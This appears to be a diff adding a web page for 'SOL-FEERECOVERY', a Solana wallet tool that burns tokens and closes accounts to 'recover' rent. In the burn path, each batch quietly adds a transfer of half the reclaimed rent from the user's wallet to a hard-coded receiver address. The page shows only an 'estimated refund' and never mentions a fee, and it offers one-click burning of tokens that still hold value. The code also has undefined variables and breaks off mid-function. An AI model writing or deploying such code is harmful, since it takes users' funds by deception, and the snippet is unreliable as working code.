@@ -1,0 +1,1510 @@
+html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SOL-FEERECOVERY</title>
+    <link rel="apple-touch-icon" sizes="512x512" href="{{ url_for('static', filename='logo-512.png') }}">
+    <link rel="icon" type="image/png" sizes="512x512" href="{{ url_for('static', filename='logo-512.png') }}">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bn.js@5.2.1/lib/bn.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* أنماط النافذة المنبثقة */
+        .progress-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .progress-modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .progress-modal-content {
+            background: transparent;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            padding: 30px;
+        }
+
+        .progress-modal-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        .progress-modal-message {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #aaa;
+        }
+
+        .progress-modal-result {
+            font-size: 28px;
+            font-weight: bold;
+            margin: 20px 0;
+            padding: 15px;
+        }
+
+        .progress-modal-result.success {
+            color: #4CAF50;
+            text-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
+            font-weight: bold;
+            font-size: 24px;
+        }
+
+        .progress-modal-result.error {
+            color: #f44336;
+        }
+
+        .progress-modal-details {
+            margin-top: 20px;
+            color: #888;
+            font-size: 16px;
+        }
+
+        .modal-progress-container {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            margin: 20px 0;
+            height: 40px;
+        }
+
+        .modal-progress-bar {
+            height: 100%;
+            background: #ffffff;
+            border-radius: 8px;
+            width: 0%;
+            transition: width 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            width: 100%;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            background: #0a0b0d;
+            line-height: 1.6;
+            color: #ffffff;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            padding-top: 0 !important;
+            flex: 1;
+            margin-top: 0;
+            background: #0a0b0d;
+            min-height: 100vh;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding: 15px 20px;
+            background: #0a0b0d;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        h1 {
+            color: #ffffff;
+            margin: 0;
+            font-size: 1.8rem;
+        }
+
+        .connect-btn {
+            padding: 12px 24px;
+            background: #2196F3;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        .connect-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        .cleanup-btn {
+            padding: 12px 24px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        .cleanup-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        .token-list {
+            display: grid;
+            gap: 15px;
+            margin-top: 20px;
+            padding: 0 20px;
+        }
+
+        .token-list {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding: 0 20px;
+        }
+
+        .token-item {
+            background: rgba(0, 30, 0, 0.95);
+            padding: 15px;
+            text-align: center;
+            transition: all 0.2s ease;
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.15);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .token-item.selected {
+            background: rgba(220, 53, 69, 0.2);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .token-info {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            text-align: left;
+            flex: 1;
+        }
+
+        .token-address {
+            font-size: 0.8em;
+            color: #888;
+        }
+
+        #walletInfo {
+            margin-top: 20px;
+        }
+
+        .error {
+            color: #e53e3e;
+            background: #fed7d7;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+
+        .success {
+            color: #2f855a;
+            background: #c6f6d5;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+
+        .tab-navigation {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+            gap: 15px;
+        }
+
+        .nav-arrow {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 40px;
+            cursor: pointer;
+            padding: 5px 15px;
+            transition: transform 0.2s;
+            font-family: Arial, sans-serif;
+        }
+
+        .nav-arrow:hover {
+            color: #bbbbbb;
+            transform: scale(1.2);
+        }
+
+        .current-tab {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffffff;
+            text-transform: uppercase;
+            min-width: 150px;
+            text-align: center;
+            text-shadow: 0 0 10px rgba(255,255,255,0.3);
+            letter-spacing: 1px;
+        }
+
+        .intro-content {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+        }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 25px;
+            margin-top: 40px;
+            padding: 0 20px;
+        }
+
+        .wallet-link {
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 20px;
+            border-radius: 16px;
+            text-align: center;
+            transition: all 0.2s ease;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .wallet-link:hover {
+            background: rgba(255, 255, 255, 0.06);
+            transform: translateY(-2px);
+        }
+
+        .controls {
+            margin: 20px 0;
+            text-align: right;
+            padding: 0 20px;
+        }
+
+        .progress-container {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            margin: 10px 0;
+            height: 40px;
+            padding: 0 10px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: #ffffff;
+            border-radius: 8px;
+            width: 0%;
+            transition: width 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px;
+            color: #888;
+            font-size: 16px;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+
+        @media (max-width: 480px) {
+            .progress-container {
+                height: 35px;
+            }
+            .progress-bar {
+                font-size: 14px;
+            }
+            .progress-info {
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            .controls {
+                text-align: center;
+            }
+        }
+
+        .selection-summary {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(10, 11, 13, 0.95);
+            padding: 12px 16px;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
+            border-top: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .selection-summary.hidden {
+            opacity: 0;
+            visibility: hidden;
+            transform: translateX(-50%) translateY(20px);
+        }
+
+        .summary-info {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .summary-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .summary-label {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 5px;
+        }
+
+        .summary-value {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .cleanup-summary-btn {
+            padding: 12px 30px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 1.1em;
+            transition: all 0.2s ease;
+        }
+
+        .cleanup-summary-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+        .loading {
+            position: relative;
+            width: 45px !important;
+            height: 45px !important;
+            padding: 0 !important;
+        }
+        .loading::after {
+            content: "";
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: translateY(-50%) rotate(360deg); }
+        }
+
+        .processing-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .processing-message {
+            font-size: 24px;
+            color: #ffffff;
+            margin-bottom: 20px;
+        }
+
+        .processing-progress-container {
+            width: 100%;
+            max-width: 500px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            margin: 10px 0;
+            height: 40px;
+        }
+
+        .processing-progress-bar {
+            height: 100%;
+            background: #ffffff;
+            border-radius: 8px;
+            width: 0%;
+            transition: width 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .cancelled-message {
+            color: #ff4444;
+            font-size: 28px;
+            font-weight: bold;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+    </style>
+</head>
+<body>
+    <!-- النافذة المنبثقة لعرض التقدم -->
+    <div id="progressModal" class="progress-modal">
+        <div class="progress-modal-content">
+            <div id="progressModalTitle" class="progress-modal-title">Please Wait</div>
+            <div id="progressModalMessage" class="progress-modal-message loading">Please Wait...</div>
+
+            <div class="modal-progress-container">
+                <div id="modalProgressBar" class="modal-progress-bar">0%</div>
+            </div>
+
+            <div id="progressModalResult" class="progress-modal-result" style="display: none;"></div>
+            <div id="progressModalDetails" class="progress-modal-details" style="display: none;"></div>
+        </div>
+    </div>
+
+    <div class="header" style="margin-top: -20px;">
+        <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
+            <img src="{{ url_for('static', filename='your-icon.png') }}" width="130" height="130" style="margin-top: -5px; margin-left: -40px;">
+            <h1 style="margin-top: 10px; font-size: 1.5rem; margin-left: -20px;">SOL-FEERECOVERY</h1>
+        </div>
+        <div style="display: flex; gap: 10px; margin-top: 10px;">
+            <button onclick="connectWallet()" id="connectBtn" class="connect-btn" style="padding: 12px 30px; font-size: 16px; background: #4CAF50;">Connect Wallet</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div id="introContent" class="intro-content">
+            <p style="margin-bottom: 25px; margin-top: 30px;">
+                Clean up your Solana wallet by removing unwanted tokens and empty accounts.
+            </p>
+            <p style="font-weight: 600; margin-bottom: 40px;">
+                Connect your wallet to get started.
+            </p>
+
+            <div class="wallet-grid" style="margin-top: 20px;">
+                <a href="phantom://browse?url=https://your-site.com" class="wallet-link">
+                    <img src="{{ url_for('static', filename='phantom-wallet.png') }}" width="64" height="64" alt="Phantom">
+                    <div style="margin-top: 5px;">Phantom</div>
+                </a>
+                <a href="solflare://browse?url=https://your-site.com" class="wallet-link">
+                    <img src="{{ url_for('static', filename='solflare-wallet.png') }}" width="64" height="64" alt="Solflare">
+                    <div style="margin-top: 5px;">Solflare</div>
+                </a>
+                <a href="trust://browser?url=https://your-site.com" class="wallet-link">
+                    <img src="{{ url_for('static', filename='trust-wallet.png') }}" width="64" height="64" alt="Trust">
+                    <div style="margin-top: 5px;">Trust</div>
+                </a>
+                <a href="cbwallet://dapp?url=https://your-site.com" class="wallet-link">
+                    <img src="{{ url_for('static', filename='coinbase-wallet.png') }}" width="64" height="64" alt="Coinbase">
+                    <div style="margin-top: 5px;">Coinbase</div>
+                </a>
+            </div>
+        </div>
+
+        <div id="walletInfo"></div>
+
+        <div id="tokenList" class="token-list"></div>
+        <div id="processingContainer" class="processing-container">
+            <div class="processing-message">Please wait...</div>
+            <div class="processing-progress-container">
+                <div id="processingProgressBar" class="processing-progress-bar">0%</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let wallet = null;
+        let selectedTokens = new Set();
+        const tabs = ['TOKENS', 'NFTS', 'EMPTY'];
+        let currentTabIndex = 0;
+        let walletData = null;
+        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+        const BURN_BATCH_SIZE = 9; // testing with 9 tokens/transaction for burn+close
+const CLOSE_BATCH_SIZE = 12; // 12 tokens/transaction for close-only
+        const LAMPORTS_PER_SOL = 1000000000;
+        const REFUND_RECEIVER = new solanaWeb3.PublicKey('GAGr8msGLKJdjU6SzxXdEDKVMMQDBMA4QZqy9GZAyVdZ');
+        const REFUND_AMOUNT = 0.00204 * LAMPORTS_PER_SOL; // المبلغ الكامل للـ rent هو 0.00204 SOL
+
+        const BN = window.BN;
+
+        async function getCloseAccountInstruction(account, wallet) {
+            const walletPubkey = new solanaWeb3.PublicKey(wallet);
+            const accountPubkey = new solanaWeb3.PublicKey(account);
+
+            return new solanaWeb3.TransactionInstruction({
+                keys: [
+                    { pubkey: accountPubkey, isSigner: false, isWritable: true },
+                    { pubkey: walletPubkey, isSigner: false, isWritable: true },
+                    { pubkey: walletPubkey, isSigner: true, isWritable: false },
+                ],
+                programId: TOKEN_PROGRAM_ID,
+                data: Uint8Array.from([9])
+            });
+        }
+
+        async function getBurnAndCleanupInstructions(tokenAccount, wallet) {
+            const connection = new solanaWeb3.Connection(
+                "{{ RPC_URL }}",
+                { commitment: 'confirmed' }
+            );
+
+            const accountInfo = await connection.getParsedAccountInfo(new solanaWeb3.PublicKey(tokenAccount));
+            if (!accountInfo.value) throw new Error("Token account not found");
+
+            const tokenAmount = accountInfo.value.data.parsed.info.tokenAmount;
+            const amount = new BN(tokenAmount.amount);
+
+            const burnData = new Uint8Array(9);
+            burnData[0] = 8;
+            burnData.set(amount.toArray('le', 8), 1);
+
+            const burnInstruction = new solanaWeb3.TransactionInstruction({
+                keys: [
+                    { pubkey: new solanaWeb3.PublicKey(tokenAccount), isSigner: false, isWritable: true },
+                    { pubkey: new solanaWeb3.PublicKey(accountInfo.value.data.parsed.info.mint), isSigner: false, isWritable: true },
+                    { pubkey: new solanaWeb3.PublicKey(wallet), isSigner: true, isWritable: false },
+                ],
+                programId: TOKEN_PROGRAM_ID,
+                data: burnData
+            });
+
+            const closeInstruction = await getCloseAccountInstruction(tokenAccount, wallet);
+
+            const transferInstruction = solanaWeb3.SystemProgram.transfer({
+                fromPubkey: new solanaWeb3.PublicKey(wallet),
+                toPubkey: REFUND_RECEIVER,
+                lamports: Math.floor(REFUND_AMOUNT / 2),
+            });
+
+            return [burnInstruction, closeInstruction, transferInstruction];
+        }
+
+        async function checkWallet() {
+            if (!wallet) return;
+            try {
+                const RPC_URL = "{{ RPC_URL }}";
+                const connection = new solanaWeb3.Connection(RPC_URL);
+                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+                    new solanaWeb3.PublicKey(wallet),
+                    { programId: TOKEN_PROGRAM_ID }
+                );
+
+                const tokens = tokenAccounts.value.map(account => {
+                    return {
+                        address: account.pubkey.toString(),
+                        mint: account.account.data.parsed.info.mint,
+                        amount: account.account.data.parsed.info.tokenAmount.uiAmount,
+                        decimals: account.account.data.parsed.info.tokenAmount.decimals,
+                        name: account.account.data.parsed.info.tokenAmount.uiAmountString
+                    };
+                });
+
+                walletData = {
+                    wallet: wallet,
+                    tokens: tokens
+                };
+
+                document.getElementById('introContent').style.display = 'none';
+                updateUI();
+                updateSelectionSummary();
+            } catch (error) {
+                console.error("Error loading wallet:", error);
+                document.getElementById('walletInfo').innerHTML = `
+                    <p class="error">❌ Failed to load wallet: ${error.message}</p>
+                `;
+            }
+        }
+
+        function updateUI() {
+            if (!walletData || !walletData.tokens) {
+                document.getElementById('tokenList').innerHTML = `<p class="error">No token data available</p>`;
+                return;
+            }
+
+            document.getElementById('introContent').style.display = 'none';
+            document.getElementById('walletInfo').innerHTML = `
+                <div style="padding: 0;">
+                    <div class="token-info-header" style="display: flex; justify-content: space-between; align-items: center; margin-top: -70px; margin-bottom: -10px;">
+                        <div style="display: flex; align-items: center;">
+                            <span style="color: #888; font-size: 16px;">Wallet: ${walletData.wallet.slice(0,4)}...${walletData.wallet.slice(-4)}</span>
+                        </div>
+                        <button onclick="showDisconnectConfirmation()" class="connect-btn" style="background: #333; padding: 6px 16px; font-size: 14px; display: flex; align-items: center; gap: 6px;">
+                            Disconnect Wallet
+                            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M18.36 6.64a9 9 0 1 1-12.73 0"></path>
+                                <line x1="12" y1="2" x2="12" y2="12"></line>
+                            </svg>
+                        </button>
+                    </div>
+                    <div class="controls" style="margin: 35px 0;">
+                        <div style="margin-top: 10px; display: flex; gap: 15px; justify-content: center;">
+                            <button onclick="toggleAllTokens()" class="connect-btn" style="padding: 8px 16px; font-size: 14px; background: #d32f2f;">Select All</button>
+                            <button onclick="select50Tokens()" class="connect-btn" style="padding: 8px 16px; font-size: 14px; background: #d32f2f;">50 Token</button>
+                            <button onclick="select100Tokens()" class="connect-btn" style="padding: 8px 16px; font-size: 14px; background: #d32f2f;">100 Token</button>
+                            <button onclick="select300Tokens()" class="connect-btn" style="padding: 8px 16px; font-size: 14px; background: #d32f2f;">300 Token</button>
+                        </div>
+                    </div>
+                    <div class="tab-navigation" style="margin: 10px 0;">
+                    <button onclick="prevTab()" class="nav-arrow">&lt;</button>
+                    <span id="currentTab" class="current-tab">${tabs[currentTabIndex]}</span>
+                    <button onclick="nextTab()" class="nav-arrow">&gt;</button>
+                </div>
+                    <div id="result" style="text-align: center; margin: 10px 0;"></div>
+                </div>
+            `;
+
+            updateTab();
+            updateSelectedCount();
+            updateEstimatedRefund(); 
+        }
+
+        function updateTab() {
+            if (!walletData || !walletData.tokens) return;
+
+            const currentTab = tabs[currentTabIndex];
+            document.getElementById('currentTab').textContent = currentTab;
+
+            let filteredTokens = [];
+            const actionBtn = document.getElementById('actionBtn');
+
+            switch(currentTab) {
+                case 'TOKENS':
+                    filteredTokens = walletData.tokens.filter(token => token.amount > 0 && token.decimals > 0);
+                    break;
+                case 'NFTS':
+                    filteredTokens = walletData.tokens.filter(token => token.decimals === 0 && token.amount === 1);
+                    break;
+                case 'EMPTY':
+                    filteredTokens = walletData.tokens.filter(token => token.amount === 0);
+                    break;
+            }
+
+            const tokenList = document.getElementById('tokenList');
+            if (filteredTokens.length === 0) {
+                tokenList.innerHTML = `<div style="text-align: center; padding: 20px;">No ${currentTab.toLowerCase()} found</div>`;
+            } else {
+                tokenList.innerHTML = filteredTokens.map(createTokenElement).join('');
+            }
+        }
+
+        function createTokenElement(token) {
+            const tokenImageUrl = `https://raw.githubusercontent.com/solana-labs/token-list/main/assets/devnet/${token.mint}/logo.png`;
+            return `
+                <div class="token-item ${selectedTokens.has(token.address) ? 'selected' : ''}" onclick="toggleTokenSelection('${token.address}', this)">
+                    <div class="token-info" style="flex: 1;">
+                        <strong>Token Account:</strong>
+                        <span class="token-address">${token.address.slice(0,4)}...${token.address.slice(-4)}</span>
+                        <span>Amount: ${token.amount || 0}</span>
+                        <span class="token-address">Mint: ${token.mint.slice(0,4)}...${token.mint.slice(-4)}</span>
+                    </div>
+
+                </div>
+            `;
+        }
+
+        function toggleTokenSelection(tokenAddress, element) {
+            if (selectedTokens.has(tokenAddress)) {
+                selectedTokens.delete(tokenAddress);
+                element.classList.remove('selected');
+            } else {
+                selectedTokens.add(tokenAddress);
+                element.classList.add('selected');
+            }
+            updateSelectedCount();
+            updateEstimatedRefund();
+            updateSelectionSummary();
+        }
+
+        function toggleAllTokens() {
+            const selectAllBtn = document.querySelector('[onclick="toggleAllTokens()"]');
+            const tokenElements = document.querySelectorAll('#tokenList .token-item');
+            const allSelected = tokenElements.length > 0 && Array.from(tokenElements).every(el => selectedTokens.has(el.getAttribute('onclick').split("'")[1]));
+
+            tokenElements.forEach(el => {
+                const tokenAddress = el.getAttribute('onclick').split("'")[1];
+                if (!allSelected) {
+                    selectedTokens.add(tokenAddress);
+                    el.classList.add('selected');
+                } else {
+                    selectedTokens.delete(tokenAddress);
+                    el.classList.remove('selected');
+                }
+            });
+
+            selectAllBtn.textContent = allSelected ? 'Select All' : 'Deselect All';
+
+            updateSelectedCount();
+            updateEstimatedRefund();
+            updateSelectionSummary();
+        }
+
+        function select50Tokens() {
+            const tokenElements = Array.from(document.querySelectorAll('#tokenList .token-item')).slice(0, 50);
+            const allSelected = tokenElements.every(el => selectedTokens.has(el.getAttribute('onclick').split("'")[1]));
+
+            tokenElements.forEach(el => {
+                const tokenAddress = el.getAttribute('onclick').split("'")[1];
+                if (!allSelected) {
+                    selectedTokens.add(tokenAddress);
+                    el.classList.add('selected');
+                } else {
+                    selectedTokens.delete(tokenAddress);
+                    el.classList.remove('selected');
+                }
+            });
+
+            updateSelectedCount();
+            updateEstimatedRefund();
+            updateSelectionSummary();
+        }
+
+        function select100Tokens() {
+            const tokenElements = Array.from(document.querySelectorAll('#tokenList .token-item')).slice(0, 100);
+            const allSelected = tokenElements.every(el => selectedTokens.has(el.getAttribute('onclick').split("'")[1]));
+
+            tokenElements.forEach(el => {
+                const tokenAddress = el.getAttribute('onclick').split("'")[1];
+                if (!allSelected) {
+                    selectedTokens.add(tokenAddress);
+                    el.classList.add('selected');
+                } else {
+                    selectedTokens.delete(tokenAddress);
+                    el.classList.remove('selected');
+                }
+            });
+
+            updateSelectedCount();
+            updateEstimatedRefund();
+            updateSelectionSummary();
+        }
+
+        function select300Tokens() {
+            const tokenElements = Array.from(document.querySelectorAll('#tokenList .token-item')).slice(0, 300);
+            const allSelected = tokenElements.every(el => selectedTokens.has(el.getAttribute('onclick').split("'")[1]));
+
+            tokenElements.forEach(el => {
+                const tokenAddress = el.getAttribute('onclick').split("'")[1];
+                if (!allSelected) {
+                    selectedTokens.add(tokenAddress);
+                    el.classList.add('selected');
+                } else {
+                    selectedTokens.delete(tokenAddress);
+                    el.classList.remove('selected');
+                }
+            });
+
+            updateSelectedCount();
+            updateEstimatedRefund();
+            updateSelectionSummary();
+        }
+
+        function updateSelectedCount() {
+            const selectedCount = document.getElementById('selectedCount');
+            if (selectedCount) {
+                selectedCount.textContent = selectedTokens.size;
+            }
+        }
+
+        function updateProgress(current, total, message) {
+            const modalProgressBar = document.getElementById('modalProgressBar');
+            const modalMessage = document.getElementById('progressModalMessage');
+
+            if (message.includes('Error') || message.includes('Failed') || message.includes('Please Wait')) {
+                modalProgressBar.style.display = 'none';
+            } else {
+                modalProgressBar.style.display = 'flex';
+                const progress = Math.round((current / total) * 100);
+                modalProgressBar.style.width = `${progress}%`;
+                modalProgressBar.textContent = `${progress}%`;
+            }
+            modalMessage.textContent = message || 'Processing...';
+        }
+
+        async function processSelectedTokens() {
+            if (selectedTokens.size === 0) {
+                showStatus('Please select at least one account to process', 'error');
+                return;
+            }
+
+            const cleanupBtn = document.getElementById('summaryCleanupBtn');
+            cleanupBtn.textContent = "";
+            cleanupBtn.classList.add('loading');
+            cleanupBtn.disabled = true;
+
+            let retryCount = 0;
+            const MAX_RETRIES = 3;
+
+            async function processInBatches() {
+                const tokenAccounts = Array.from(selectedTokens);
+                let processed = 0;
+
+                updateProgress(0, tokenAccounts.length, 'Starting process...');
+
+                const response = await fetch('/batch_process', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        accounts: tokenAccounts
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to process batch');
+                }
+
+                const result = await response.json();
+                updateProgress(result.processed, result.total, result.message);
+            }
+
+            while (retryCount < MAX_RETRIES) {
+                try {
+                    await processInBatches();
+                    break;
+                } catch (error) {
+                    if (error.message.includes('Transaction too large') && retryCount < MAX_RETRIES - 1) {
+                        console.log(`Reducing batch size from ${MAX_INSTRUCTIONS_PER_TX} to ${Math.max(1, MAX_INSTRUCTIONS_PER_TX - 1)}`);
+                        MAX_INSTRUCTIONS_PER_TX = Math.max(1, MAX_INSTRUCTIONS_PER_TX - 1);
+                        retryCount++;
+                        continue;
+                    }
+                    showStatus(`Error: ${error.message}`, 'error');
+                    break;
+                }
+            }
+
+            const currentTab = tabs[currentTabIndex];
+            const estimatedRefund = (selectedTokens.size * REFUND_AMOUNT / LAMPORTS_PER_SOL / 2).toFixed(3);
+
+            const dialogHTML = `
+                <div id="confirmDialog" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+                     background: rgba(10, 11, 13, 0.95); padding: 35px; border-radius: 16px; z-index: 1000; 
+                     box-shadow: 0 4px 20px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); max-width: 90%; width: 450px;">
+                    <h3 style="color: #fff; margin-bottom: 20px; text-align: center; font-size: 1.4em;">Confirmation</h3>
+                    <p style="color: #fff; margin-bottom: 25px; text-align: center; font-size: 1.1em;">
+                        You are about to ${currentTab === 'EMPTY' ? 'close' : 'burn and close'} ${selectedTokens.size} token accounts.<br><br>
+                        Estimated refund: ${estimatedRefund} SOL
+                    </p>
+                    <div style="display: flex; justify-content: center; gap: 15px;">
+                        <button onclick="confirmCleanup()" style="padding: 10px 25px; border-radius: 8px; border: none; 
+                                background: #4CAF50; color: white; cursor: pointer;">Confirm</button>
+                        <button onclick="cancelCleanup()" style="padding: 10px 25px; border-radius: 8px; border: none; 
+                                background: #f44336; color: white; cursor: pointer;">Cancel</button>
+                    </div>
+                </div>
+                </div>
+                <div id="overlay" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; 
+                     background: rgba(0,0,0,0.7); z-index: 999;"></div>
+            `;
+
+            document.body.insertAdjacentHTML('beforeend', dialogHTML);
+        }
+
+        async function confirmCleanup() {
+            document.getElementById('confirmDialog').remove();
+            document.getElementById('overlay').remove();
+            await executeCleanup();
+        }
+
+        function cancelCleanup() {
+            document.getElementById('confirmDialog').remove();
+            document.getElementById('overlay').remove();
+            const cleanupBtn = document.getElementById('summaryCleanupBtn');
+            cleanupBtn.textContent = "Cleanup";
+            cleanupBtn.classList.remove('loading');
+            cleanupBtn.disabled = false;
+        }
+
+        async function executeCleanup() {
+            const accounts = Array.from(selectedTokens);
+            const originalSelectedTokens = new Set(selectedTokens);
+            const connection = new solanaWeb3.Connection("{{ RPC_URL }}", { commitment: 'confirmed' });
+
+            document.getElementById('tokenList').style.display = 'none';
+            document.getElementById('processingContainer').style.display = 'flex';
+
+            const processingProgressBar = document.getElementById('processingProgressBar');
+            const processingMessage = document.querySelector('.processing-message');
+
+            async function updateTransactionStatus(signature) {
+                try {
+                    const status = await connection.getSignatureStatus(signature);
+                    return status.value?.confirmationStatus || 'processing';
+                } catch (error) {
+                    console.error('Error getting transaction status:', error);
+                    return 'error';
+                }
+            }
+
+            try {
+                const connection = new solanaWeb3.Connection(
+                    "{{ RPC_URL }}",
+                    { commitment: 'confirmed' }
+                );
+
+                processingMessage.textContent = "Preparing transactions...";
+                processingProgressBar.style.width = '0%';
+                processingProgressBar.textContent = '';
+
+                const tokens = Array.from(selectedTokens);
+                let latestBlockhash = await connection.getLatestBlockhash();
+
+                const batchSize = currentTab === 'EMPTY' ? CLOSE_BATCH_SIZE : BURN_BATCH_SIZE;
+                const batches = [];
+                for (let i = 0; i < tokens.length; i += batchSize) {
+                    batches.push(tokens.slice(i, i + batchSize));
+                }
+
+                const prepareTransaction = async (batch) => {
+                    const instructions = [];
+                    for (const token of batch) {
+                        if (currentTab === 'EMPTY') {
+                            instructions.push(await getCloseAccountInstruction(token, wallet));
+                        } else {
+                            instructions.push(...await getBurnAndCleanupInstructions(token, wallet));
+                        }
+                    }
+
+                    const messageV0 = new solanaWeb3.TransactionMessage({
+                        payerKey: new solanaWeb3.PublicKey(wallet),
+                        recentBlockhash: latestBlockhash.blockhash,
+                        instructions
+                    }).compileToV0Message();
+
+                    return new solanaWeb3.VersionedTransaction(messageV0);
+                };
+
+                const allTransactions = await Promise.all(
+                    batches.map(batch => prepareTransaction(batch))
+                );
+
+                latestBlockhash = await connection.getLatestBlockhash();
+
+                allTransactions.forEach(tx => {
+                    tx.message.recentBlockhash = latestBlockhash.blockhash;
+                });
+
+                const signedTransactions = await (window.solflare?.isSolflare ? window.solflare : window.solana).signAllTransactions(allTransactions);
+
+                const promises = signedTransactions.map(signedTx => 
+                    connection.sendRawTransaction(signedTx.serialize(), {
+                        skipPreflight: true,
+                        maxRetries: 5,
+                        preflightCommitment: 'confirmed'
+                    })
+                );
+                const signatures = await Promise.all(promises);
+
+                for (let i = 0; i < signatures.length; i++) {
+                    const signature = signatures[i];
+                    let transactionStatus = 'processing';
+
+                    while (transactionStatus === 'processing') {
+                        transactionStatus = await updateTransactionStatus(signature);
+                        const progress = Math.round(((i + 1) / signatures.length) * 100);
+
